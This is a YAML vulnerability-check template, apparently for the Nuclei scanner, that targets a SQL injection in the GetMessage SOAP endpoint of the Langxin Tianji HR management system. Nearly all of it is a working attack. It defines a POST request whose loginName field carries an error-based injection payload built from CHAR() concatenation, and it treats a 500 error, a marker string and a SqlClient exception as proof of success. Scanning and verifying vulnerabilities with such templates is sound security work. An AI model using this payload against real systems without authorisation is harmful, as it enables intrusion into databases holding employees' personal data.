folder-6/poc-yaml-hrsoft-getmessage-sqli.yaml

id: poc-yaml-hrsoft-getmessage-sqli
info:
  name: 朗新天霁人力资源管理系统GetMessage存在sql注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
http:
  - method: POST
    path:
      - '{{BaseURL}}/ws/GetFunc_code.asmx'
    headers:
      Content-Type: text/xml; charset=utf-8
      SOAPAction: "http://tempuri.org/GetMessage"
    body: |-
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
      <GetMessage xmlns="http://tempuri.org/">
      <loginName>' AND 6935 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(112)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (6935=6935) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(118)+CHAR(113))) AND 'qaq'='qaq</loginName>
      </GetMessage>
      </soap:Body>
      </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "qzpjq1qzqvq"
          - "System.Data.SqlClient.SqlException"
